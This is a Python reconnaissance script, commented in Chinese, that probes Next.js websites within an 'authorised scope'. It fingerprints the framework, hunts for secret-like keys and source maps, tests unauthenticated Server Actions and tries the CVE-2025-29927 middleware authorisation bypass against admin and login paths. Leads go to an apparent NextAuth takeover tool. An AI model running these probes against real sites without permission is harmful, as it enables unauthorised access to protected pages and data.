#!/usr/bin/env python3
"""Next.js 猎面（授权范围内）。

L1：头 / __NEXT_DATA__ / buildId / /_next/static。
L2：无 Cookie Server Action、x-middleware-subrequest 旁路、非 PUBLIC 密钥。
/_next/image 默认只记白名单行为；禁止打 IMDS。
非 Next 指纹禁止继续打 overlay / image / sourcemap（避免任意站变 L1）。
"""
from __future__ import annotations

import argparse
import json
import re
import sys
from datetime import datetime, UTC
from pathlib import Path
from typing import Any
from urllib.parse import urljoin, urlparse

try:
    import requests
    requests.packages.urllib3.disable_warnings()  # type: ignore
except ImportError:
    print("[!] pip install requests", file=sys.stderr)
    sys.exit(1)

OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import host_of, in_scope, write_probe_json  # noqa: E402

UA = "Mozilla/5.0 大爱仙尊-nextjs"
DEV_PATHS = (
    "/__nextjs_original-stack-frame?isServer=true&errorMessage=test",
    "/__nextjs_launch-editor?file=package.json&line=1",
)
DEV_NEEDLES = ("original-stack-frame", "launch-editor", "webpack://", "nextjs")
GATE_PATHS = ("/admin", "/dashboard", "/login", "/api/auth/session")
MW_HEADER = "middleware:middleware:middleware:middleware:middleware"
# 不含 token：csrfToken / csrf_token 会误报
SECRET_KEYS = (
    "secret", "password", "apikey", "api_key", "private_key",
    "database", "encryption", "connectionstring",
)
SECRET_SKIP = ("csrf", "public", "next_public", "nonce", "anonymous")


def _get(sess: requests.Session, url: str, **kw: Any) -> dict[str, Any]:
    try:
        r = sess.get(url, timeout=12, verify=False, allow_redirects=False, **kw)
    except Exception as e:
        return {"url": url, "error": str(e)[:120]}
    text = r.text or ""
    loc = r.headers.get("Location") or r.headers.get("location") or ""
    return {
        "url": url,
        "status": r.status_code,
        "size": len(text),
        "location": loc[:200],
        "headers": {
            k.lower(): v[:160]
            for k, v in r.headers.items()
            if k.lower().startswith("x-next") or k.lower() in (
                "x-powered-by", "set-cookie", "x-middleware-rewrite", "x-nextjs-cache",
            )
        },
        "snip": re.sub(r"\s+", " ", text)[:180],
        "text": text[:80000],
    }


def _is_next(home: dict[str, Any]) -> bool:
    blob = json.dumps(home.get("headers") or {}) + (home.get("text") or "")
    return bool(
        re.search(
            r"x-nextjs|__NEXT_DATA__|/_next/static|x-powered-by.:\s*Next\.js|Next-Action",
            blob,
            re.I,
        )
    )


def _build_id(text: str) -> str:
    m = re.search(r'"buildId"\s*:\s*"([^"]+)"', text or "")
    return m.group(1)[:80] if m else ""


def _action_ids(text: str) -> list[str]:
    ids = re.findall(r'"id"\s*:\s*"([a-f0-9]{20,})"', text or "", re.I)
    ids += re.findall(r'Next-Action["\']?\s*[:=]\s*["\']([a-f0-9]+)["\']', text or "", re.I)
    out: list[str] = []
    seen: set[str] = set()
    for i in ids:
        if i not in seen:
            seen.add(i)
            out.append(i)
        if len(out) >= 8:
            break
    return out


def _next_data(text: str) -> dict[str, Any]:
    m = re.search(
        r'<script[^>]*id=["\']__NEXT_DATA__["\'][^>]*>(.*?)</script>',
        text or "",
        re.I | re.S,
    )
    if not m:
        return {}
    try:
        return json.loads(m.group(1))
    except Exception:
        return {"parse_error": True}


def _secretish(obj: Any, hits: list[str], path: str = "") -> None:
    if len(hits) >= 12:
        return
    if isinstance(obj, dict):
        for k, v in obj.items():
            p = f"{path}.{k}" if path else str(k)
            kl = str(k).lower()
            if any(s in kl for s in SECRET_SKIP):
                _secretish(v, hits, p)
                continue
            secret_key = any(s in kl for s in SECRET_KEYS) or kl.startswith("sk_")
            if secret_key and "NEXT_PUBLIC" not in str(k):
                hits.append(p[:120])
            _secretish(v, hits, p)
    elif isinstance(obj, list):
        for i, v in enumerate(obj[:20]):
            _secretish(v, hits, f"{path}[{i}]")


def _nextauth(home: dict[str, Any]) -> bool:
    blob = json.dumps(home.get("headers") or {}) + (home.get("text") or "")
    return bool(re.search(
        r"next-auth|admin_session|NEXTAUTH|kyber|/api/auth/callback",
        blob,
        re.I,
    ))


def _action_unauth(status: int, headers: Any, text: str) -> bool:
    """200 回首页 HTML 不算无会话成功。须 RSC / JSON / action 跳转头。"""
    if status not in {200, 303}:
        return False
    if re.search(r"unauthorized|unauthenticated|login required|sign in", text, re.I):
        return False
    hdrs = {str(k).lower(): str(v) for k, v in dict(headers or {}).items()}
    ctype = (hdrs.get("content-type") or "").lower()
    if "text/x-component" in ctype or hdrs.get("x-action-redirect") or hdrs.get("x-nextjs-redirect"):
        return True
    head = (text or "")[:400].lstrip()
    if head.startswith("{") or head.startswith("["):
        return True
    if "<html" in head.lower() or "<!doctype" in head.lower():
        return False
    return "text/x-component" in (text or "")[:80].lower()


def run(args: argparse.Namespace) -> dict[str, Any]:
    host = host_of(args.base)
    if not host or not in_scope(host):
        print(f"[!] 不在 scope：{host or args.base}", file=sys.stderr)
        sys.exit(2)
    base = args.base.rstrip("/")
    sess = requests.Session()
    sess.headers["User-Agent"] = UA
    findings: list[dict[str, Any]] = []
    home = _get(sess, base + "/")
    nxt = _is_next(home)
    if nxt:
        findings.append({"level": "L1", "signal": "nextjs-fingerprint", "status": home.get("status")})
        print("  L1 nextjs fingerprint")
    bid = _build_id(home.get("text") or "")
    nd = _next_data(home.get("text") or "")
    secret_paths: list[str] = []
    _secretish(nd.get("props") if isinstance(nd, dict) else nd, secret_paths)
    if secret_paths:
        findings.append({"level": "L2", "signal": "next-data-secret-keys", "keys": secret_paths[:8]})
        print("  L2 __NEXT_DATA__ secret-like keys")
    if _nextauth(home):
        findings.append({"level": "L1", "signal": "nextauth-handoff", "next": "tg-bot-nextauth-takeover"})
        print("  L1 NEXTAUTH/Kyber → tg-bot-nextauth-takeover")

    if nxt:
        for p in DEV_PATHS:
            row = _get(sess, urljoin(base + "/", p.lstrip("/")))
            st = int(row.get("status") or 0)
            blob = ((row.get("snip") or "") + (row.get("text") or "")).lower()
            if st not in {0, 404, 301, 302, 307, 308} and any(n in blob for n in DEV_NEEDLES):
                findings.append({"level": "L2", "signal": "next-dev-overlay", "path": p, "status": st})
                print(f"  L2 dev overlay {p} {st}")
                break

        img = _get(sess, f"{base}/_next/image?url=https://example.invalid/x.png&w=64&q=75")
        img_st = int(img.get("status") or 0)
        findings.append({
            "level": "L1",
            "signal": "next-image-allowlist",
            "status": img_st,
            "note": "400=白名单拒绝（正常）；禁止把 400 当 SSRF；未打 IMDS",
        })

        if bid:
            data_url = f"{base}/_next/data/{bid}/index.json"
            drow = _get(sess, data_url)
            if int(drow.get("status") or 0) == 200 and (drow.get("snip") or "").lstrip().startswith("{"):
                findings.append({"level": "L1", "signal": "next-data-json", "url": data_url, "size": drow.get("size")})
                print("  L1 /_next/data JSON")

        sm = _get(sess, f"{base}/_next/static/chunks/main.js.map")
        if int(sm.get("status") or 0) == 200 and "sources" in (sm.get("snip") or "").lower():
            findings.append({"level": "L1", "signal": "sourcemap", "url": sm.get("url")})
            print("  L1 sourcemap")

        actions = _action_ids(home.get("text") or "")
        if actions:
            aid = actions[0]
            boundary = "----seNext"
            body = (
                f"--{boundary}\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n[]\r\n"
                f"--{boundary}--\r\n"
            )
            bare = requests.Session()
            bare.headers["User-Agent"] = UA
            try:
                r = bare.post(
                    base + "/",
                    timeout=12,
                    verify=False,
                    allow_redirects=False,
                    headers={
                        "Next-Action": aid,
                        "Content-Type": f"multipart/form-data; boundary={boundary}",
                    },
                    data=body.encode(),
                )
                txt = (r.text or "")[:300]
                unauth = _action_unauth(r.status_code, r.headers, r.text or "")
                row = {
                    "level": "L2" if unauth else "L1",
                    "signal": "server-action-unauth" if unauth else "server-action-seen",
                    "action_id": aid[:16] + "…",
                    "status": r.status_code,
                    "snip": re.sub(r"\s+", " ", txt)[:160],
                }
                findings.append(row)
                print(f"  {row['level']} Next-Action {r.status_code}")
            except Exception as e:
                findings.append({"level": "L1", "signal": "server-action-error", "error": str(e)[:120]})

        for p in GATE_PATHS:
            base_row = _get(sess, urljoin(base + "/", p.lstrip("/")))
            mw_row = _get(
                sess,
                urljoin(base + "/", p.lstrip("/")),
                headers={"x-middleware-subrequest": MW_HEADER},
            )
            b_st = int(base_row.get("status") or 0)
            m_st = int(mw_row.get("status") or 0)
            gated = b_st in {301, 302, 303, 307, 308, 401, 403}
            opened = m_st == 200
            if gated and opened:
                findings.append({
                    "level": "L2",
                    "signal": "middleware-subrequest-bypass",
                    "path": p,
                    "base_status": b_st,
                    "mw_status": m_st,
                    "cve": "CVE-2025-29927",
                })
                print(f"  L2 middleware bypass {p} {b_st}→{m_st}")
                break

    levels = {f.get("level") for f in findings}
    level = "L2" if "L2" in levels else ("L1" if "L1" in levels else "none")
    report = {
        "target": base,
        "ts": datetime.now(UTC).isoformat(),
        "level": level,
        "build_id": bid,
        "nextjs": nxt,
        "nextauth_handoff": _nextauth(home),
        "findings": [{k: v for k, v in f.items() if k != "text"} for f in findings],
        "playbook": "传承/次骨·猎面.md",
        "next": "L2 → 记 surface.json；NEXTAUTH 交接 tg-bot-nextauth-takeover。image 400 不是 SSRF。",
        "host": urlparse(base).hostname,
    }
    out_path = write_probe_json(
        report, case=args.case, out=args.out, case_subdir="nextjs", filename="surface.json",
    )
    print(json.dumps({"level": level, "findings": len(findings), "out": str(out_path)}, ensure_ascii=False))
    return report


def main() -> None:
    ap = argparse.ArgumentParser(description="Next.js 猎面探针")
    ap.add_argument("-u", "--url", "--base", dest="base", required=True)
    ap.add_argument("--case", default="")
    ap.add_argument("--out", type=Path, default=None)
    args = ap.parse_args()
    run(args)


if __name__ == "__main__":
    main()
